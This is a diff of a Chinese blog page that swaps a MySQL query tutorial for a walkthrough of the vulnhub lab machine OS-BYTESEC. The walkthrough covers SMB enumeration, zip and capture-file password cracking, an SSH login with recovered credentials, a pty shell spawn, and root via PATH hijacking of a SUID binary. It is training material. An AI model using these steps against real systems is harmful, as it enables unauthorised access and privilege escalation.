-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where username like <span class="token string">"%m%"</span><span class="token punctuation">;</span>
-</code></pre>
-<p>下划线 _ 匹配一个字符</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> select* from <span class="token function">users</span> where username like <span class="token string">"moo_"</span>
-</code></pre>
-<p><code>and</code> 查询</p>
-<p>满足多个条件</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where id<span class="token operator">=</span>1 and username<span class="token operator">=</span><span class="token string">'moon'</span><span class="token punctuation">;</span>
-</code></pre>
-<p><code>or</code> 查询</p>
-<p>满足任意一个条件</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where id<span class="token operator">=</span>1 or username<span class="token operator">=</span><span class="token string">'moon'</span><span class="token punctuation">;</span>
-</code></pre>
-<p><code>OR</code> 和 <code>AND</code> 一起使用的情况</p>
-<p><code>OR</code> 和 <code>AND</code> 一起使用的时候，<code>AND</code> 的优先级高于 <code>OR</code>，因此二者一起使用时，<br>会先运算 <code>AND</code> 两边的表达式，再运算 <code>OR</code> 两边的表达式。</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where id<span class="token operator">></span>5 and password<span class="token operator">=</span><span class="token string">'123456c'</span> or username<span class="token operator">=</span><span class="token string">'moon1'</span><span class="token punctuation">;</span>
-</code></pre>
-<p>聚合查询</p>
-<p>count 返回行数</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> count<span class="token punctuation">(</span>*<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">;</span>
-mysql<span class="token operator">></span> <span class="token keyword">select</span> count<span class="token punctuation">(</span>id<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">;</span>
-</code></pre>
-<ul>
-<li>COUNT() 返回某列的行数</li>
-<li>SUM() 返回某列值的和</li>
-<li>AVG() 返回某列的平均值</li>
-<li>MAX() 返回某列的最大值</li>
-<li>MIN() 返回某列的最小值</li>
-</ul>
-<p>分组查询</p>
-<p>如果报错请在 <code>my.ini</code> 添加 </p>
-<pre class=" language-bash"><code class="language-bash">sql_mode<span class="token operator">=</span>STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION
-</code></pre>
-<p>GROUP BY</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> GROUP BY password<span class="token punctuation">;</span>
-+----+----------+----------+
-<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
-+----+----------+----------+
-<span class="token operator">|</span> 3 <span class="token operator">|</span> moon1 <span class="token operator">|</span> 123456 <span class="token operator">|</span>
-<span class="token operator">|</span> 1 <span class="token operator">|</span> moon <span class="token operator">|</span> 456789 <span class="token operator">|</span>
-+----+----------+----------+
-2 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.01 sec<span class="token punctuation">)</span>
-</code></pre>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> SELECT * FROM <span class="token function">users</span> GROUP BY username<span class="token punctuation">;</span>
-+----+----------+----------+
-<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
-+----+----------+----------+
-<span class="token operator">|</span> 2 <span class="token operator">|</span> alex1 <span class="token operator">|</span> 456789 <span class="token operator">|</span>
-<span class="token operator">|</span> 1 <span class="token operator">|</span> moon <span class="token operator">|</span> 456789 <span class="token operator">|</span>
-<span class="token operator">|</span> 3 <span class="token operator">|</span> moon1 <span class="token operator">|</span> 123456 <span class="token operator">|</span>
-+----+----------+----------+
-3 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.01 sec<span class="token punctuation">)</span>
-</code></pre>
-<p>使用 <code>LIMIT</code> 限制查询结果的数量</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> limit 2,10<span class="token punctuation">;</span>
-mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> as u where u.id<span class="token operator">=</span>1<span class="token punctuation">;</span>
-</code></pre>
-<p>为表和字段取别名</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> username as myname from <span class="token function">users</span><span class="token punctuation">;</span>
-</code></pre>
-<p><strong><code>mysql</code> 的子查询</strong></p>
-<p><code>where</code> 型子查询（把内层查询结果当作外层查询的比较条件）</p>
-<pre><code>mysql&gt; select * from users where id in (select id from users where id&gt;10);
-</code></pre>
-<p><code>from</code> 型子查询 (把内层的查询结果供外层再次查询)</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token punctuation">(</span>select username,age from users<span class="token punctuation">)</span> as agev_a where age<span class="token operator">></span>20<span class="token punctuation">;</span>
-mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token punctuation">(</span>select * from <span class="token function">users</span> where id<span class="token operator">>=</span>10<span class="token punctuation">)</span> as age_10<span class="token punctuation">;</span>
-<span class="token punctuation">(</span>select * from <span class="token function">users</span> where id<span class="token operator">>=</span>10<span class="token punctuation">)</span>查询出来的是一个集合,别名为age_10
-mysql<span class="token operator">></span> <span class="token keyword">select</span> * from age_10<span class="token punctuation">;</span>
-</code></pre>
-<p><code>exists</code>型子查询（把外层查询结果拿到内层，看内层的查询是否成立）</p>
-<p>1<br>0</p>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where EXISTS <span class="token punctuation">(</span>select * from <span class="token function">users</span> where id<span class="token operator">></span>1<span class="token punctuation">)</span>
-</code></pre>
-<p><strong>联合查询（两个表的查询）</strong></p>
+<h3 id="0x003-smb服务漏洞"><a href="#0x003-smb服务漏洞" class="headerlink" title="0x003 smb服务漏洞"></a>0x003 smb服务漏洞</h3><hr>
 <blockquote>
-<p>注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。</p>
+<p>这里查看了别人的利用过程 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/f-carey/p/15953802.html#tid-6a3MAx">https://www.cnblogs.com/f-carey/p/15953802.html#tid-6a3MAx</a></p>
 </blockquote>
-<p>当 <code>ALL</code> 随 <code>UNION</code> 一起使用时（即 <code>UNION ALL</code>），不消除重复行</p>
-<p><code>UNION ALL</code> 查询全部 而且不会消除重复的行</p>
-<p><code>union</code> </p>
-<p><code>SQL UNION ALL</code> 语法</p>
-<blockquote>
-<p>union 的用法及注意事项<br>两次查询的列数必须一致</p>
-</blockquote>
-<pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> union <span class="token keyword">select</span> *,1 from news<span class="token punctuation">;</span>
-</code></pre>
-<pre class=" language-bash"><code class="language-bash">CREATE TABLE <span class="token variable"><span class="token variable">`</span>news<span class="token variable">`</span></span> <span class="token punctuation">(</span>
-     <span class="token variable"><span class="token variable">`</span><span class="token function">id</span><span class="token variable">`</span></span> int<span class="token punctuation">(</span>11<span class="token punctuation">)</span> NOT NULL AUTO_INCREMENT,
-     <span class="token variable"><span class="token variable">`</span>title<span class="token variable">`</span></span> varchar<span class="token punctuation">(</span>255<span class="token punctuation">)</span> not NULL,
-     <span class="token variable"><span class="token variable">`</span>content<span class="token variable">`</span></span> varchar<span class="token punctuation">(</span>255<span class="token punctuation">)</span> not null,
-     PRIMARY KEY <span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span><span class="token function">id</span><span class="token variable">`</span></span><span class="token punctuation">)</span>
-    <span class="token punctuation">)</span> ENGINE<span class="token operator">=</span>MyISAM AUTO_INCREMENT<span class="token operator">=</span>0 DEFAULT CHARSET<span class="token operator">=</span>utf8<span class="token punctuation">;</span> 
-insert into news <span class="token punctuation">(</span>title,content<span class="token punctuation">)</span>values<span class="token punctuation">(</span><span class="token string">'a1'</span>,<span class="token string">'a1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-</code></pre>
+<h4 id="检测smb服务漏洞"><a href="#检测smb服务漏洞" class="headerlink" title="检测smb服务漏洞"></a>检测smb服务漏洞</h4><p>根据前面端口扫描的结果，发现没有存在可以利用的地方。</p>
+<p><img src="https://cdnjson.com/images/2022/11/14/469266bbba5012b33.png" alt="smb服务扫描"></p>
+<h4 id="使用smbmap枚举smb用户信息"><a href="#使用smbmap枚举smb用户信息" class="headerlink" title="使用smbmap枚举smb用户信息"></a>使用smbmap枚举smb用户信息</h4><p><code>smbmap -H 192.168.1.106</code></p>
+<p><img src="https://cdnjson.com/images/2022/11/14/4_18b9e32221ffc1364.png" alt="smbmap"></p>
+<h4 id="使用enum4linux检测目标系统上的smb服务"><a href="#使用enum4linux检测目标系统上的smb服务" class="headerlink" title="使用enum4linux检测目标系统上的smb服务"></a>使用enum4linux检测目标系统上的smb服务</h4><p><code>enum4linux 192.168.1.106</code></p>
+<p><img src="https://cdnjson.com/images/2022/11/14/4_2fb8811aad1c87c3a.png" alt="enum4linux"></p>
+<h4 id="使用-smbclient-访问目录"><a href="#使用-smbclient-访问目录" class="headerlink" title="使用 smbclient 访问目录"></a>使用 smbclient 访问目录</h4><p><code>smbclient //192.168.1.106/smb -U smb</code></p>
+<p><img src="https://cdnjson.com/images/2022/11/14/5.png" alt="smbclient"></p>
+<p>发现一个main.txt文件和一个safe.zip压缩文件，下载到本地进行查看</p>
+<p>main.txt  没有什么可用信息<br>safe.zip  需要输入密码</p>
+<h4 id="fcrackzip-破解压缩文件"><a href="#fcrackzip-破解压缩文件" class="headerlink" title="fcrackzip 破解压缩文件"></a>fcrackzip 破解压缩文件</h4><p><code>fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u safe.zip</code></p>
+<p><img src="https://cdnjson.com/images/2022/11/14/7.png" alt="fcrackzip"></p>
+<p>解压后，里面一个图片和一个cap文件，使用wireshark打开，但是没有发现什么可用信息。</p>
+<p><img src="https://cdnjson.com/images/2022/11/14/8.png" alt="wireshark"></p>
+<h4 id="使用aircrack-ng暴力猜解"><a href="#使用aircrack-ng暴力猜解" class="headerlink" title="使用aircrack-ng暴力猜解"></a>使用aircrack-ng暴力猜解</h4><p>猜解出账号密码：blackjax/snowflake</p>
+<p><code>aircrack-ng -w /usr/share/wordlists/rockyou.txt user.cap</code></p>
+<p><img src="https://cdnjson.com/images/2022/11/14/9.png" alt="aircrack-ng"></p>
+<h4 id="ssh远程登陆"><a href="#ssh远程登陆" class="headerlink" title="ssh远程登陆"></a>ssh远程登陆</h4><p><code>ssh blackjax@192.168.1.106 -p 2525</code><br><code>python3 -c 'import pty;pty.spawn("/bin/bash")'  #切换为交互模式</code></p>
+<p><img src="https://cdnjson.com/images/2022/11/14/10.png" alt="ssh"></p>
 <hr>
-<h3 id="0x006-更多教程"><a href="#0x006-更多教程" class="headerlink" title="0x006 更多教程"></a>0x006 更多教程</h3><p><a target="_blank" rel="noopener" href="https://www.runoob.com/mysql/mysql-tutorial.html">MySQL详细教程</a></p>
+<h3 id="0x004-环境变量挟持提权"><a href="#0x004-环境变量挟持提权" class="headerlink" title="0x004 环境变量挟持提权"></a>0x004 环境变量挟持提权</h3><hr>
+<h4 id="查找suid权限的文件"><a href="#查找suid权限的文件" class="headerlink" title="查找suid权限的文件"></a>查找suid权限的文件</h4><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+<p><img src="https://cdnjson.com/images/2022/11/14/11.png" alt="suid"></p>
+<h4 id="分析netscan文件"><a href="#分析netscan文件" class="headerlink" title="分析netscan文件"></a>分析netscan文件</h4><p><img src="https://cdnjson.com/images/2022/11/14/12.png" alt="netscan"></p>
+<p><code>xxd /usr/bin/netscan | less</code></p>
+<p>发现netscan文件会调用netstat -anpt命令。</p>
+<p><img src="https://cdnjson.com/images/2022/11/14/13.png" alt="less"></p>
+<h4 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h4><pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"/bin/sh"</span> <span class="token operator">></span>netstat
+<span class="token function">chmod</span> 777 <span class="token function">netstat</span>
+<span class="token function">export</span> PATH<span class="token operator">=</span>/tmp:<span class="token variable">$PATH</span>
+</code></pre>
+<p><img src="https://cdnjson.com/images/2022/11/14/14.png" alt="提权"></p>
+<hr>
+<h3 id="0x005-查找flag"><a href="#0x005-查找flag" class="headerlink" title="0x005 查找flag"></a>0x005 查找flag</h3><hr>
+<p><img src="https://cdnjson.com/images/2022/11/14/15.png" alt="flag"></p>
 
                 
             </div>
@@ -1003,7 +629,7 @@ insert into news <span class="token punctuation">(</span>title,content<span clas
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Cx330Lm.github.io/2022/08/08/toc-heading-3/">http://Cx330Lm.github.io/2022/08/08/toc-heading-3/</a>
+                    <a href="http://Cx330Lm.github.io/2022/11/14/toc-heading-14/">http://Cx330Lm.github.io/2022/11/14/toc-heading-14/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1045,8 +671,8 @@ insert into news <span class="token punctuation">(</span>title,content<span clas
                                     <span class="chip bg-color">Web Security</span>
                                 </a>
                             
-                                <a href="/tags/MySQL/">
-                                    <span class="chip bg-color">MySQL</span>
+                                <a href="/tags/vulnhub/">
+                                    <span class="chip bg-color">vulnhub</span>
                                 </a>
                             
                         </div>
@@ -1353,53 +979,51 @@ insert into news <span class="token punctuation">(</span>title,content<span clas
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/08/09/toc-heading-4/">
+                <a href="/2022/11/14/toc-heading-14/">
                     <div class="card-image">
                         
-                        <img src="https://s1.ax1x.com/2022/08/13/vtu0PS.jpg" class="responsive-img" alt="WEB安全DIV+CSS基础">
+                        <img src="https://cdnjson.com/images/2022/11/14/bg.jpg" class="responsive-img" alt="vulnhub靶场OS-BYTESEC">
                         
-                        <span class="card-title">WEB安全DIV+CSS基础</span>
+                        <span class="card-title">vulnhub靶场OS-BYTESEC</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            DIV+CSS是WEB设计标准，它是一种网页的布局方法。与传统中通过表格（table）布局定位的方式不同，它可以实现网页页面内容与表现相分离。
+                            
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-08-09
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-14
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" class="post-category">
-                                    编程语言
+                            <a href="/categories/vulnhub/" class="post-category">
+                                    vulnhub
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
-                    
-                    <a href="/tags/HTML/">
-                        <span class="chip bg-color">HTML</span>
-                    </a>
                     
                     <a href="/tags/Web-Security/">
                         <span class="chip bg-color">Web Security</span>
                     </a>
                     
-                    <a href="/tags/DIV-CSS/">
-                        <span class="chip bg-color">DIV+CSS</span>
+                    <a href="/tags/vulnhub/">
+                        <span class="chip bg-color">vulnhub</span>
                     </a>
                     
                 </div>
@@ -1413,30 +1037,30 @@ insert into news <span class="token punctuation">(</span>title,content<span clas
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/08/08/toc-heading-2/">
+                <a href="/2022/11/13/toc-heading-13/">
                     <div class="card-image">
                         
-                        <img src="https://s1.ax1x.com/2022/08/13/vtnVTf.jpg" class="responsive-img" alt="WEB安全HTML基础">
+                        <img src="https://cdnjson.com/images/2022/11/13/bg.jpg" class="responsive-img" alt="vulnhub靶场Os-hackNos-3">
                         
-                        <span class="card-title">WEB安全HTML基础</span>
+                        <span class="card-title">vulnhub靶场Os-hackNos-3</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            HTML:超文本标记语言（英语：HyperText Markup Language，简称：HTML）是一种用于创建网页的标准标记语言。您可以使用 HTML 来建立自己的 WEB 站点，HTML 运行在浏览器上，由浏览器来解析。
+                            
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-08-08
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-13
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" class="post-category">
-                                    编程语言
+                            <a href="/categories/vulnhub/" class="post-category">
+                                    vulnhub
                                 </a>
                             
                             
@@ -1446,12 +1070,12 @@ insert into news <span class="token punctuation">(</span>title,content<span clas
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/HTML/">
-                        <span class="chip bg-color">HTML</span>
-                    </a>
-                    
                     <a href="/tags/Web-Security/">
                         <span class="chip bg-color">Web Security</span>
+                    </a>
+                    
+                    <a href="/tags/vulnhub/">
+                        <span class="chip bg-color">vulnhub</span>
                     </a>
                     
                 </div>
